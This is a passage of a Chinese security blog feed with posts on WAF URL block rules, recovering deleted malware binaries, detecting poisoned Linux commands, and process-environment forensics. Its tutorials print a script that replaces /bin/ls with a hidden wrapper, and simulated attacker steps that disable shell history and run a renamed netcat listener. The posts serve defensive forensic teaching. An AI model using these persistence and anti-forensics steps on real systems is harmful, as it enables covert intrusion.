class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">require &apos;init&apos;</span><br><span class="line"></span><br><span class="line">function waf_main()</span><br><span class="line">    if white_ip_check() then</span><br><span class="line">    elseif black_ip_check() then</span><br><span class="line">    elseif user_agent_attack_check() then</span><br><span class="line">    elseif cc_attack_check() then</span><br><span class="line">    elseif cookie_attack_check() then</span><br><span class="line">    elseif white_url_check() then</span><br><span class="line">    elseif url_attack_check() then</span><br><span class="line">    elseif url_args_attack_check() then</span><br><span class="line">    --elseif post_attack_check() then</span><br><span class="line">    else</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">waf_main()</span><br></pre></td></tr></table></figure><p>规则在rule-config目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@vm:/usr/local/openresty/nginx/conf/waf# ls rule-config/</span><br><span class="line">args.rule     cookie.rule  url.rule        whiteip.rule</span><br><span class="line">blackip.rule  post.rule    useragent.rule  whiteurl.rule</span><br></pre></td></tr></table></figure><p>查看url.rule得内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@vm:/usr/local/openresty/nginx/conf/waf/rule-config# cat url.rule </span><br><span class="line">\.(htaccess|bash_history)</span><br><span class="line">\.(bak|inc|old|mdb|sql|backup|java|class|tgz|gz|tar|zip)$</span><br><span class="line">(phpmyadmin|jmx-console|admin-console|jmxinvokerservlet)</span><br><span class="line">java\.lang</span><br><span class="line">\.svn\/</span><br><span class="line">/(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\w+).(php|jsp)</span><br></pre></td></tr></table></figure><p>可以看到一条规则一行</p><p>都是一些敏感文件，敏感后缀，敏感目录等</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>输入openresty启动nginx（其实是nginx得软连接）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@vm:~# ll /usr/local/openresty/bin/openresty </span><br><span class="line">lrwxrwxrwx 1 root root 37 Oct  5 01:57 /usr/local/openresty/bin/openresty -&gt; /usr/local/openresty/nginx/sbin/nginx*</span><br></pre></td></tr></table></figure><p>在浏览器输入zip后缀</p><p><img src="http://pic.giantbranch.cn/pic/1696511595118.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Ubuntu20.04&lt;br&gt;openresty-1.21.4.2&lt;/p&gt;
&lt;/blockquot
      
    
    </summary>
    
    
      <category term="企业安全建设,waf" scheme="https://www.giantbranch.cn/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-waf/"/>
    
  </entry>
  
  <entry>
    <title>如何从活动的Linux恶意软件中恢复已删除的二进制文件</title>
    <link href="https://www.giantbranch.cn/2023/07/21/%E5%A6%82%E4%BD%95%E4%BB%8E%E6%B4%BB%E5%8A%A8%E7%9A%84Linux%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%B8%AD%E6%81%A2%E5%A4%8D%E5%B7%B2%E5%88%A0%E9%99%A4%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://www.giantbranch.cn/2023/07/21/如何从活动的Linux恶意软件中恢复已删除的二进制文件/</id>
    <published>2023-07-21T00:00:00.000Z</published>
    <updated>2023-10-13T13:38:29.718Z</updated>
    
    <content type="html"><![CDATA[<p>通常，Linux恶意软件在启动后会自行删除，以免文件扫描器和完整性检查发现二进制文件的存在。这也会使得取得二进制文件变得困难，从而增加了取证分析的难度。</p><p>然而，在Linux上恢复已删除的进程二进制文件是很容易的，只要该进程仍然在内存中。</p><p>在 Linux 系统中，<code>/proc/&lt;PID&gt;/exe</code> 文件是一个特殊的符号链接文件，它指向当前正在运行的进程所执行的可执行文件。即使该可执行文件已经被删除，该符号链接仍然存在，并且可以继续指向被删除的文件。</p><p>这是因为 Linux 系统中的文件删除实际上是通过引用计数来处理的。当一个文件被打开或执行时，系统会为该文件增加一个引用计数。只有当该文件的引用计数降为零时，才会将其删除并释放磁盘空间。</p><p>所以恢复已删除的进程二进制文件的基本命令很简单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /proc/&lt;PID&gt;/exe /tmp/recovered_bin</span><br></pre></td></tr></table></figure><h1 id="恢复已删除的进程的实践"><a href="#恢复已删除的进程的实践" class="headerlink" title="恢复已删除的进程的实践"></a>恢复已删除的进程的实践</h1><p>下面以sleep命令来模拟一个已从磁盘中删除的进程。您可以在自己的Linux系统上安全地运行这一系列命令，以便练习恢复已删除的二进制文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">cp /bin/sleep x</span><br><span class="line">./x 3600 &amp;</span><br><span class="line">rm x</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># root @ ubuntu in ~ [16:37:43]</span><br><span class="line">$ cd /tmp</span><br><span class="line"># root @ ubuntu in /tmp [16:37:45]</span><br><span class="line">$ cp /bin/sleep x</span><br><span class="line"># root @ ubuntu in /tmp [16:37:45]</span><br><span class="line">$ ./x 3600 &amp;</span><br><span class="line">[1] 13499</span><br><span class="line"># root @ ubuntu in /tmp [16:37:45]</span><br><span class="line">$ rm x</span><br><span class="line"># root @ ubuntu in /tmp [16:37:47]</span><br><span class="line">$ ls -al /tmp/x</span><br><span class="line">ls: cannot access &apos;/tmp/x&apos;: No such file or directory</span><br></pre></td></tr></table></figure><p>可以看到文件确实不存在了，进程还在运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps -aux | grep 3600</span><br><span class="line">root     13499  0.0  0.0   9224   748 pts/0    S    16:37   0:00 ./x 3600</span><br><span class="line">root     13540  0.0  0.0  16180  1124 pts/0    S+   16:38   0:00 grep --color=auto 3600</span><br></pre></td></tr></table></figure><p>我们ls查看，可以看到文件被标记为删除了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /proc/13499/exe</span><br><span class="line">lrwxrwxrwx 1 root root 0 7月  21 16:39 /proc/13499/exe -&gt; &apos;/tmp/x (deleted)&apos;</span><br><span class="line"># root @ ubuntu in /tmp [16:39:20]</span><br><span class="line">$ ls /tmp/x</span><br><span class="line">ls: cannot access &apos;/tmp/x&apos;: No such file or directory</span><br></pre></td></tr></table></figure><p>我们用cp恢复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /proc/13499/exe /tmp/recovered_bin</span><br></pre></td></tr></table></figure><p>可以看到文件完好无缺</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># root @ ubuntu in /tmp [16:40:38]</span><br><span class="line">$ md5sum /tmp/recovered_bin </span><br><span class="line">2fb28b5c237207b71c89ac6eb5861a5c  /tmp/recovered_bin</span><br><span class="line"># root @ ubuntu in /tmp [16:40:48]</span><br><span class="line">$ md5sum /bin/sleep </span><br><span class="line">2fb28b5c237207b71c89ac6eb5861a5c  /bin/sleep</span><br></pre></td></tr></table></figure><p>假如这正是一个病毒木马，你可以可以在安全的虚拟环境中，使用调试器和ida去分析了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>所以，绝不要轻易杀掉你发现的可疑进程，你可能失去获取病毒木马的机会。</p><p>如果系统感染了某种病毒，请将其隔离在网络中，然后慢慢查看。不要急于行动，因为这样会破坏关键数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通常，Linux恶意软件在启动后会自行删除，以免文件扫描器和完整性检查发现二进制文件的存在。这也会使得取得二进制文件变得困难，从而增加了取证分析的难度。&lt;/p&gt;
&lt;p&gt;然而，在Linux上恢复已删除的进程二进制文件是很容易的，只要该进程仍然在内存中。&lt;/p&gt;
&lt;p&gt;在 Li
      
    
    </summary>
    
    
      <category term="取证" scheme="https://www.giantbranch.cn/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>检测Linux二进制文件污染</title>
    <link href="https://www.giantbranch.cn/2023/07/21/%E6%A3%80%E6%B5%8BLinux%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E6%B1%A1%E6%9F%93/"/>
    <id>https://www.giantbranch.cn/2023/07/21/检测Linux二进制文件污染/</id>
    <published>2023-07-21T00:00:00.000Z</published>
    <updated>2023-10-13T13:38:31.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>二进制污染是篡改系统命令并用恶意版本替换它。这可以是全面替换为一个新文件，设计成像旧命令一样运行，或者篡改原地可执行文件，使其直接运行恶意代码。</p><p>如果一个毫不知情的用户运行了一个被污染的命令，就是以该用户身份运行攻击者想要执行的代码。</p><h1 id="简单污染示例"><a href="#简单污染示例" class="headerlink" title="简单污染示例"></a>简单污染示例</h1><p>下面的shell模拟污染/bin/ls</p><p>注意：不要在生成环境中进行下面的实验操作！！！<br>注意：不要在生成环境中进行下面的实验操作！！！<br>注意：不要在生成环境中进行下面的实验操作！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># root @ ubuntu in ~/tmp [16:09:03]</span><br><span class="line">$ cat poison_test.sh </span><br><span class="line">#!/usr/bin/env bash</span><br><span class="line"># Linux binary poisoning example.</span><br><span class="line"># Based on backdoorme poison script.</span><br><span class="line"></span><br><span class="line">echo &quot;Poisoning ls command.&quot;</span><br><span class="line">echo &quot;Making backup of ls to /bin/ls.bak&quot;</span><br><span class="line">if [ ! -f /bin/ls.bak ]; then</span><br><span class="line">    cp /bin/ls /bin/ls.bak</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;Making /bin/.bin to hold original binary&quot;</span><br><span class="line">mkdir /bin/.bin</span><br><span class="line">echo &quot;Moving original binary to /bin/.bin&quot;</span><br><span class="line">mv /bin/ls /bin/.bin/</span><br><span class="line"></span><br><span class="line">echo &quot;Creating poisoned ls script in /bin&quot;</span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt; /bin/ls</span><br><span class="line">echo &quot;( ls &amp; ) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; /bin/.bin/ls \$@&quot; &gt;&gt; /bin/ls</span><br><span class="line">echo &quot;echo \&quot;POISONED /bin/ls active!\&quot;&quot; &gt;&gt; /bin/ls</span><br><span class="line">chmod +x /bin/ls</span><br><span class="line"></span><br><span class="line">echo &quot;Done&quot;</span><br><span class="line"># root @ ubuntu in ~/tmp [16:09:11]</span><br><span class="line">$ bash ./poison_test.sh </span><br><span class="line">Poisoning ls command.</span><br><span class="line">Making backup of ls to /bin/ls.bak</span><br><span class="line">Making /bin/.bin to hold original binary</span><br><span class="line">Moving original binary to /bin/.bin</span><br><span class="line">Creating poisoned ls script in /bin</span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p>当然上面是写了无害的<code>echo \&quot;POISONED /bin/ls active!\&quot;</code> ，我们可以做任何shell可以做的操作，添加crontab，往authorized_keys添加公钥，下载木马等等。</p><p>可以看到ls已经被我们污染了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls /tmp/</span><br><span class="line">systemd-private-eac9d075027e4c038c766b9a8b7d0834-apache2.service-O1DAvq</span><br><span class="line">systemd-private-eac9d075027e4c038c766b9a8b7d0834-colord.service-txti0P</span><br><span class="line">systemd-private-eac9d075027e4c038c766b9a8b7d0834-ModemManager.service-CUXkDr</span><br><span class="line">systemd-private-eac9d075027e4c038c766b9a8b7d0834-rtkit-daemon.service-EkyD2v</span><br><span class="line">systemd-private-eac9d075027e4c038c766b9a8b7d0834-systemd-resolved.service-bRmKdM</span><br><span class="line">systemd-private-eac9d075027e4c038c766b9a8b7d0834-systemd-timesyncd.service-pcKTtw</span><br><span class="line">POISONED /bin/ls active!</span><br></pre></td></tr></table></figure><h1 id="在Linux上手动查找被感染的命令"><a href="#在Linux上手动查找被感染的命令" class="headerlink" title="在Linux上手动查找被感染的命令"></a>在Linux上手动查找被感染的命令</h1><p>如果手动去寻找，非常耗时，且很难下手。在Ubuntu系统中，仅在/bin和/sbin目录下就有500多个命令。如果再加上/usr/bin和/usr/sbin目录，那就有数千个命令了。因此，首先要尝试的是运行软件包验证来加快这个过程。</p><p>假如是Redhat based的系统，可以执行<code>rpm -Va | grep ^..5.</code></p><p>假如是Debian/Ubuntu based的系统，可以apt安装debsums，执行<code>debsums -c</code></p><p>下面我以Ubuntu为例，可以看到，debsums 很快发现了/bin/ls不对劲</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># root @ ubuntu in ~ [16:11:56]</span><br><span class="line">$ debsums -c</span><br><span class="line">/bin/ls</span><br></pre></td></tr></table></figure><p>假如上面debsums 没有发现任何内容，接下来我们需要手动操作，查找不是ELF的可执行文件，当然攻击者可以用另一个编译好的二进制文件替换一个二进制文件。但是替换shell是最容易实现的</p><p>比如针对/bin目录: <code>file /bin/* | grep -v ELF | grep -v link</code>, <code>grep -v link</code>是忽略掉软链接文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ file /bin/* | grep -v ELF | grep -v link</span><br><span class="line">/bin/bzdiff:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/bzexe:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/bzgrep:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/bzmore:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/egrep:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/fgrep:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/gunzip:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/gzexe:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/lesspipe:                       POSIX shell script, ASCII text executable</span><br><span class="line">/bin/ls:                             Bourne-Again shell script, ASCII text executable</span><br><span class="line">/bin/red:                            POSIX shell script, ASCII text executable</span><br><span class="line">/bin/setupcon:                       POSIX shell script, UTF-8 Unicode text executable</span><br><span class="line">/bin/uncompress:                     POSIX shell script, ASCII text executable</span><br><span class="line">/bin/unicode_start:                  POSIX shell script, ASCII text executable</span><br><span class="line">/bin/which:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zcat:                           POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zcmp:                           POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zdiff:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zegrep:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zfgrep:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zforce:                         POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zgrep:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zless:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/zmore:                          POSIX shell script, ASCII text executable</span><br><span class="line">/bin/znew:                           POSIX shell script, ASCII text executable</span><br></pre></td></tr></table></figure><p>我们可以看到这里也有/bin/ls，而且还是个Bourne-Again shell script，这就很有问题了。</p><p>如果你怀疑某个命令可能被篡改，请直接使用strings命令查看是否有任何可疑内容。不要对你认为可能是恶意文件的任何文件运行strace命令。我们将这一点用粗体标出，因为有些人可能想尝试strace命令，但实际上运行strace会在主机上运行实际的可执行文件，这是一个非常糟糕的想法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ strings /bin/ls</span><br><span class="line">#!/bin/bash</span><br><span class="line">( ls &amp; ) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; /bin/.bin/ls $@</span><br><span class="line">echo &quot;POISONED /bin/ls active!&quot;</span><br></pre></td></tr></table></figure><p>可以看到这里还有隐藏目录/bin/.bin/</p><p>最后我们用<code>rm -rf /bin/.bin/ &amp;&amp; mv /bin/ls.bak /bin/ls</code>来恢复ls</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://sandflysecurity.com/blog/detecting-linux-binary-file-poisoning/" target="_blank" rel="noopener">https://sandflysecurity.com/blog/detecting-linux-binary-file-poisoning/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;二进制污染是篡改系统命令并用恶意版本替换它。这可以是全面替换为一个新文件，设计成像旧命令一样运行，或者篡改原地可执行文件，使其直接运行恶意代
      
    
    </summary>
    
    
      <category term="test" scheme="https://www.giantbranch.cn/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>使用Linux进程环境变量进行取证</title>
    <link href="https://www.giantbranch.cn/2023/07/20/%E4%BD%BF%E7%94%A8Linux%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%8F%96%E8%AF%81/"/>
    <id>https://www.giantbranch.cn/2023/07/20/使用Linux进程环境变量进行取证/</id>
    <published>2023-07-20T00:00:00.000Z</published>
    <updated>2023-10-13T13:38:28.898Z</updated>
    
    <content type="html"><![CDATA[<p>注：下面来自半翻译，半实践</p><p>对Linux进程进行取证，可以通过<code>/proc/&lt;PID&gt;/environ</code>来查看某个进程的环境变量，来获取一些信息。</p><p>所以说，遇到可疑的进程不要立即杀掉，不然取证都可能无从下手。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>当在Linux上启动一个进程时，该进程的许多环境变量将在其运行期间保持不变。那么虽然启动该进程的原始shell已经消失很久，但在有一些shell变量仍然继承下来了。</p><p>在进程的环境变量中可以获得什么呢?</p><ol><li><p>history anti-forensics的证据</p></li><li><p>二进制文件的命令行和路径</p></li><li><p>启动进程的用户</p></li><li><p>启动时二进制文件使用的自定义变量，可能包含密钥和其他内容</p></li><li><p>SSH连接信息：哪个ip启动的</p></li><li><p>……</p><p>对于第5点，即使攻击者从日志中清除了他们的IP地址，如果他们<strong>通过SSH</strong>进入，很有可能他们使用的IP地址仍然留在他们启动的进程中，等待被获取。</p></li></ol><h1 id="模拟实验"><a href="#模拟实验" class="headerlink" title="模拟实验"></a>模拟实验</h1><h2 id="模拟攻击"><a href="#模拟攻击" class="headerlink" title="模拟攻击"></a>模拟攻击</h2><p> 假如我们是攻击者，连上一台机子的ssh</p><p> 注： HISTSIZE是一个环境变量，用于控制命令历史记录的大小。通过将HISTSIZE设置为0，即export HISTSIZE=0，实际上是告诉操作系统不保存任何命令历史记录。这意味着你运行的每个命令都不会被记录下来，无法通过上下箭头键或history命令访问之前执行的命令。</p><p> ssh连上后我们在机子上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export HISTSIZE=0</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">cp /bin/nc x</span><br><span class="line">x -lp 6666 &amp;</span><br></pre></td></tr></table></figure><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>通过列出正在监听的端口，可以查看到一个x的可疑进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -antp | grep LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      391/rpcbind         </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      392/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      874/sshd            </span><br><span class="line">tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      32334/cupsd         </span><br><span class="line">tcp        0      0 0.0.0.0:6666            0.0.0.0:*               LISTEN      16343/x             </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      391/rpcbind         </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      1050/apache2        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      874/sshd            </span><br><span class="line">tcp6       0      0 ::1:631                 :::*                    LISTEN      32334/cupsd</span><br></pre></td></tr></table></figure><p>查看进程环境变量（我手动将ip用X打码了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ strings /proc/16343/environ </span><br><span class="line">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:</span><br><span class="line">LC_MEASUREMENT=zh_CN.UTF-8</span><br><span class="line">SSH_CONNECTION=10.82.X.X 5561 172.16.2.3 22</span><br><span class="line">LESSCLOSE=/usr/bin/lesspipe %s %s</span><br><span class="line">LC_PAPER=zh_CN.UTF-8</span><br><span class="line">LC_MONETARY=zh_CN.UTF-8</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">OLDPWD=/root</span><br><span class="line">S_COLORS=auto</span><br><span class="line">LC_NAME=zh_CN.UTF-8</span><br><span class="line">XDG_SESSION_ID=2246</span><br><span class="line">USER=root</span><br><span class="line">GOPATH=/root/go</span><br><span class="line">QT_QPA_PLATFORMTHEME=appmenu-qt5</span><br><span class="line">PWD=/tmp</span><br><span class="line">HOME=/root</span><br><span class="line">GOROOT=/usr/local/go</span><br><span class="line">SSH_CLIENT=10.82.X.X 5561 22</span><br><span class="line">LC_ADDRESS=zh_CN.UTF-8</span><br><span class="line">LC_NUMERIC=zh_CN.UTF-8</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">MAIL=/var/mail/root</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">SHLVL=1</span><br><span class="line">LC_TELEPHONE=zh_CN.UTF-8</span><br><span class="line">LOGNAME=root</span><br><span class="line">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/0</span><br><span class="line">PATH=.:.:/usr/lib/llvm-11/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/go/bin:/root/go/bin</span><br><span class="line">LC_IDENTIFICATION=zh_CN.UTF-8</span><br><span class="line">PS1=\[\e]0;\u@\h: \w\a\]\[\e[34m\]#\[\e[m\] \[\e[37m\]\u\[\e[m\] @ \[\e[36m\]\h\[\e[m\] in \[\e[34m\]\w\[\e[m\] [\t]\n$ </span><br><span class="line">HISTSIZE=0</span><br><span class="line">LESSOPEN=| /usr/bin/lesspipe %s</span><br><span class="line">LC_TIME=zh_CN.UTF-8</span><br><span class="line">_=./x</span><br></pre></td></tr></table></figure><p>从上面我们可以提取出下面有用的信息</p><ul><li><p>HISTSIZE=0，这个说过了，属于反取证的方式</p></li><li><p>SSH_CONNECTION=10.82.X.X 5561 